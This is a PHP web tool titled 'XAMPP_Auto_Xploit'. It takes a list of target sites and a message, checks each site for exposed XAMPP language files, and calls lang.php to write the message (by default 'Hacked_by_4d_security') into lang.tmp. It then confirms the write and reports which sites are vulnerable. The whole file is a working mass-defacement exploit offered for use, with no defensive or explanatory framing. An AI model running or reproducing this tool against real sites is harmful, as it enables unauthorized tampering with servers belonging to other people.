<?php
$judul=@XAMPP_Auto_Xploit;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
          <table class="table table-bordered table-striped table-hover">
	<form method='POST' action=''>
			Target :<br>
			<textarea type='url' name='target' class='form-control text-primary' autocomplete="off" style='height:280px;' placeholder='site.com/[path]' required></textarea><br><br>
			 Message :<br>
			<input type='text' class='form-control text-danger' autocomplete="off" name='msg' placeholder='Hello Mina San'/>
			<br><br><center>
			<input type='submit' class="btn btn-outline-danger" value='Exploit!' />
		</form>
	</center>
		<?php
		error_reporting(0);
		if($_POST){
			$target = $_POST['target'];
			$msg = htmlspecialchars(str_replace(" ","_",$_POST['msg']));
			$msg1 = str_replace("<","_",$msg);
			$msg2 = str_replace(">","_",$msg1);
			$msg3 = str_replace("&gt;","_",$msg2);
			$pwn = str_replace("&lt;","_",$msg3);
			
			if($pwn == ""){
				$pwn = "Hacked_by_4d_security";
			}
			
			$targets = explode("\r\n",$target);
			foreach($targets as $site){
				if(!preg_match("/^http:\/\//",$site) AND !preg_match("/^https:\/\//",$site)){
					$sites = "http://$site";
				}else{
					$sites = $site;
				}
				$showsites = htmlspecialchars($sites);
				
				$chx = curl_init("$sites/xampp/lang.tmp");
				curl_setopt($chx, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($chx, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($chx, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($chx, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
				curl_exec($chx);
				$httpcodex = curl_getinfo($chx, CURLINFO_HTTP_CODE);
				curl_close($chx);
				
				$chs = curl_init("$sites/security/lang.tmp");
				curl_setopt($chs, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($chs, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($chs, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($chs, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
				curl_exec($chs);
				$httpcodes = curl_getinfo($chs, CURLINFO_HTTP_CODE);
				curl_close($chs);
				
				if($httpcodex == 200){
					$ck = curl_init("$sites/xampp/lang.php?$pwn");
					curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ck, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ck, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
					$cka = curl_exec($ck);
					if($cka){
						$ch = curl_init("$sites/xampp/lang.tmp");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
						$cek = curl_exec($ch);
						if(preg_match("/$pwn/",$cek)){
							echo "<br><br><a href='$sites/xampp/lang.tmp' target='_blank'>$showsites/xampp/lang.tmp</a> => OK<br>";
						}else{
							echo "<br><br>$showsites => FAILED<br>";
						}
						curl_close($ch);
					}
				}else if($httpcodes == 200){
					$ck = curl_init("$sites/security/lang.php?$pwn");
					curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ck, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ck, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
					$cka = curl_exec($ck);
					if($cka){
						$ch = curl_init("$sites/security/lang.tmp");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
						$cek = curl_exec($ch);
						if(preg_match("/$pwn/",$cek)){
							echo "<br><br><a href='$sites/security/lang.tmp' target='_blank'>$showsites/security/lang.tmp</a> => OK<br>";
						}else{
							echo "<br><br>$showsites => Fail<br>";
						}
						curl_close($ch);
					}
				}else{
					echo "$showsites => Not Vuln<br>";
				}
			}
		}
		?>
	</table>